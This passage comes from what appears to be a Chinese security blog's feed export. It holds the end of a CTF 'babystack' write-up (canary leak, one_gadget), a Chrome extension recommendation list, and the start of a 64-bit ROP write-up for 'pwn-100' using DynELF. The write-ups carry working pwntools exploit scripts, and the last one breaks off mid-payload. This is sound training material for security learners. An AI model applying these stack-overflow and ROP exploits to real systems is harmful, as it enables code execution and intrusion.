punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">51596</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve <span class="token operator">=</span> <span class="token number">0x45216</span> <span class="token comment" spellcheck="true">#one_gadget得到</span>main_addr <span class="token operator">=</span> <span class="token number">0x400908</span> <span class="token comment" spellcheck="true">#main函数地址</span>rdi_addr <span class="token operator">=</span> <span class="token number">0x400a93</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true">#s和canary距离</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要使用sendline，即输入'A'*0x88后还要有一个回车，目的是将canary尾部的'\x00'覆盖为'\x0A'</span><span class="token comment" spellcheck="true">#用puts函数输出canary时，puts函数遇到'\x00'会截断，使用'\x0A'覆盖'\x00'，才能将canary输出</span><span class="token comment" spellcheck="true">#注意，本程序是小端字节序（低位地址对应高位字节）</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要等到'\n'之后再读取</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r.recv(7)是由于puts输出的canary最后一位是'\x0A',要重新换成'\x00'</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用puts函数将puts函数的地址输出</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve_addr <span class="token operator">=</span> offset <span class="token operator">+</span> execvepayload3 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用Chrome插件功能介绍系列&amp;&amp;安装指南</title>
      <link href="/2020/03/22/chrome/"/>
      <url>/2020/03/22/chrome/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Infinity-New-Tab"><a href="#0x00-Infinity-New-Tab" class="headerlink" title="0x00.Infinity New Tab"></a>0x00.Infinity New Tab</h2><p><img src="https://img-blog.csdnimg.cn/20200322004344837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Infinity New Tab"><br><img src="https://img-blog.csdnimg.cn/20200322005431651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="安装之后的界面"></p><blockquote><p>介绍：这是一款美化标签页的工具，功能强大，支持添加标签页网址图标。<br>推荐级别：3星级<br><a href="https://chrome.google.com/webstore/detail/infinity-new-tab-producti/dbfmnekepjoapopniengjbcpnbljalfg/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x01-集装箱"><a href="#0x01-集装箱" class="headerlink" title="0x01.集装箱"></a>0x01.集装箱</h2><p><img src="https://img-blog.csdnimg.cn/20200322010719582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="google助手"><br><img src="https://img-blog.csdnimg.cn/20200322010822852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="右键增强"></p><blockquote><p>介绍：集装箱插件是google助手、网盘助手、优惠购、增益功能等插件的合集。尤其要推荐一下右键增强功能，选择文本、右键选择集装箱，会出现很多功能，比如使用各种搜索引擎进行搜索，而且还能生成当前界面二维码，google助手功能也十分强大！<br>推荐级别：5星级<br><a href="https://chrome.google.com/webstore/detail/%E9%9B%86%E8%A3%85%E7%AE%B1/kbgigmcnifmaklccibmlepmahpfdhjch/related?hl=zh-CN" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x02-OneTab-Plus"><a href="#0x02-OneTab-Plus" class="headerlink" title="0x02.OneTab Plus"></a>0x02.OneTab Plus</h2><p><img src="https://img-blog.csdnimg.cn/2020032201213940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="整合标签页"></p><blockquote><p>介绍：OneTab Plus可以把多个标签页整合成一个列表形式的标签页，这个功能对我来说真的很好用，因为平时打比赛可能同时打开好几十个标签页…<br>推荐级别：4星级<br><a href="https://chrome.google.com/webstore/detail/onetab-plustab-manage-pro/lepdjbhbkpfenckechpdfohdmkhogojf/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x03-Adblock-Plus"><a href="#0x03-Adblock-Plus" class="headerlink" title="0x03.Adblock Plus"></a>0x03.Adblock Plus</h2><p><img src="https://img-blog.csdnimg.cn/20200322012942878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Adblock Plus功能"></p><blockquote><p>介绍：Chrome支持的广告屏蔽插件，可以屏蔽绝大多数网站广告，可以自行设置网站白名单，并不会降低网页打开速度。<br>推荐级别：3颗星<br><a href="https://chrome.google.com/webstore/detail/adblock-plus-free-ad-bloc/cfhdojbkjhnklbpkdaibdccddilifddb/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x04-Tampermonkey"><a href="#0x04-Tampermonkey" class="headerlink" title="0x04.Tampermonkey"></a>0x04.Tampermonkey</h2><p><img src="https://img-blog.csdnimg.cn/20200322015254707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Tampermonkey"></p><blockquote><p>介绍：Tampermonkey，国内称作“油猴”，是一个管理浏览器脚本的插件。它能安装众多实用的浏览器脚本。<br>推荐级别：4颗半星<br><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><p><strong>油猴脚本：</strong></p><h3 id="1-Ac-baidu"><a href="#1-Ac-baidu" class="headerlink" title="1.Ac-baidu"></a>1.Ac-baidu</h3><p><img src="https://img-blog.csdnimg.cn/20200322015534813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Ac-baidu安装后界面"></p><blockquote><p>介绍：Ac-baidu是一款重定向优化搜索引擎的脚本，能大幅度提高搜索速度，优化显示界面。<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/14178-ac-baidu-%E9%87%8D%E5%AE%9A%E5%90%91%E4%BC%98%E5%8C%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%8B%97%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2-%E5%8E%BB%E5%B9%BF%E5%91%8A-favicon-%E5%8F%8C%E5%88%97" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h3 id="2-哔哩哔哩播放器调整R"><a href="#2-哔哩哔哩播放器调整R" class="headerlink" title="2.哔哩哔哩播放器调整R"></a>2.哔哩哔哩播放器调整R</h3><p><img src="https://img-blog.csdnimg.cn/20200322021003993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="哔哩哔哩播放器调整R"><br><img src="https://img-blog.csdnimg.cn/20200322021118326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="脚本功能"></p><blockquote><p>介绍：把b站彻底变成学习网站！<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/371672-%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9-bilibili-com-%E6%92%AD%E6%94%BE%E5%99%A8%E8%B0%83%E6%95%B4r-ver-stardust" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位程序rop链构造|攻防世界pwn进阶区 pwn-100</title>
      <link href="/2020/03/21/pwn-100/"/>
      <url>/2020/03/21/pwn-100/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题和pwn-200有类似之处，都是栈溢出漏洞，可以循环泄露，所以都使用DynELF来泄露。但是pwn200是32位程序用rop，pwn100是64位程序用rop。区别在于32位程序利用栈布局，而64位程序调用参数是利用寄存器。且本题是用puts函数来泄露，puts函数不能指定输出字符串的长度。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="0x01-ida调试发现sub-40063D函数可以溢出"><a href="#0x01-ida调试发现sub-40063D函数可以溢出" class="headerlink" title="0x01.ida调试发现sub_40063D函数可以溢出"></a>0x01.ida调试发现sub_40063D函数可以溢出</h3><p><img src="https://img-blog.csdnimg.cn/20200316194943361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x02-cyclic计算溢出需要填充72字节"><a href="#0x02-cyclic计算溢出需要填充72字节" class="headerlink" title="0x02.cyclic计算溢出需要填充72字节"></a>0x02.cyclic计算溢出需要填充72字节</h3><h3 id="0x03-checksec看一下保护"><a href="#0x03-checksec看一下保护" class="headerlink" title="0x03.checksec看一下保护"></a>0x03.checksec看一下保护</h3><pre class="line-numbers language-yaml"><code class="language-yaml"> <span class="token key atrule">Arch</span><span class="token punctuation">:</span>     amd64<span class="token punctuation">-</span>64<span class="token punctuation">-</span>little    <span class="token key atrule">RELRO</span><span class="token punctuation">:</span>    Partial RELRO //可以修改GOT表    <span class="token key atrule">Stack</span><span class="token punctuation">:</span>    No canary found    <span class="token key atrule">NX</span><span class="token punctuation">:</span>       NX enabled    <span class="token key atrule">PIE</span><span class="token punctuation">:</span>      No PIE (0x400000)//未开启地址随机化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-利用思路："><a href="#0x04-利用思路：" class="headerlink" title="0x04.利用思路："></a>0x04.利用思路：</h3><blockquote><p>1.利用DynELF模块泄露system函数地址<br>2.构造rop链，写入”/bin/sh”<br>3.调用system函数</p></blockquote><h3 id="0x05-可以用vmmap查找binary文件地址"><a href="#0x05-可以用vmmap查找binary文件地址" class="headerlink" title="0x05.可以用vmmap查找binary文件地址"></a>0x05.可以用vmmap查找binary文件地址</h3><p><img src="https://img-blog.csdnimg.cn/20200316194318782.jpg" alt=""><br>这里找到一个 <code>rw-p</code>的地址，即<strong>可写地址 0x601000</strong>,pwn-200做的时候是用的bss段地址<code>bss_addr=elf.bss()</code>，但是这一题我看网上wp基本没有用bss段地址的，我自己试了一下用bss段地址打不通。</p><h3 id="0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP"><a href="#0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP" class="headerlink" title="0x06.用  ROPgadget --binary pwn100 --only &quot;pop|ret&quot; | grep rdi命令寻找ROP"></a>0x06.用  <code>ROPgadget --binary pwn100 --only "pop|ret" | grep rdi</code>命令寻找ROP</h3><p><img src="https://img-blog.csdnimg.cn/20200316194440265.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-python"><code class="language-python">poprdi_addr<span class="token operator">=</span><span class="token number">0x400763</span>pop6_addr<span class="token operator">=</span><span class="token number">0x40075a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x07-32位程序和64位程序的差别"><a href="#0x07-32位程序和64位程序的差别" class="headerlink" title="0x07.32位程序和64位程序的差别"></a>0x07.32位程序和64位程序的差别</h3><blockquote><ul><li>32位程序中，函数调用是直接将参数压栈，需要用的时候直接将参数放在栈上，调用的函数就能直接取得参数并运算。</li><li>x64的gcc优化了x86的传参方式，x64程序设立了几个寄存器李存放参数，调用函数的时候先向寄存器之中放参数，当参数的数量大于寄存器的时候，才会向栈中放参数。</li></ul></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell">fun<span class="token punctuation">(</span>1<span class="token punctuation">,</span>2<span class="token punctuation">,</span>3<span class="token punctuation">,</span>4<span class="token punctuation">,</span>5<span class="token punctuation">,</span>6<span class="token punctuation">,</span>7<span class="token punctuation">,</span>8<span class="token punctuation">,</span>9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>当我们调用这个函数的时候<span class="token operator">/</span><span class="token operator">/</span>x86传参的方式是这样：push 9<span class="token punctuation">;</span>push 8<span class="token punctuation">;</span>···push 1<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>x64传参方式：mov r9d 6<span class="token punctuation">;</span>mov r8d 5<span class="token punctuation">;</span>mov ecx 4<span class="token punctuation">;</span>mov edx 3<span class="token punctuation">;</span>mov esi 2<span class="token punctuation">;</span>mov edi 1<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+16]</span><span class="token punctuation">,</span> 9<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+8]</span><span class="token punctuation">,</span> 8<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp]</span><span class="token punctuation">,</span> 7<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>传参的顺序，默认是从最后一个参数先开始传入，x86和x64都是一样。</strong><br><a href="https://blog.csdn.net/qinying001/article/details/102922215" target="_blank" rel="noopener">参考blog</a></p><h3 id="0x08-写出leak函数"><a href="#0x08-写出leak函数" class="headerlink" title="0x08.写出leak函数"></a>0x08.写出leak函数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x01-先尝试泄露"><a href="#0x01-先尝试泄露" class="headerlink" title="0x01.先尝试泄露"></a>0x01.先尝试泄露</h3><p><img src="https://img-blog.csdnimg.cn/20200316194453783.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200316194502980.jpg" alt=""><br><strong>0x4个字节时候才是需要泄露的地址</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-下面尝试补充成exp"><a href="#0x02-下面尝试补充成exp" class="headerlink" title="0x02.下面尝试补充成exp"></a>0x02.下面尝试补充成exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>gpt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> 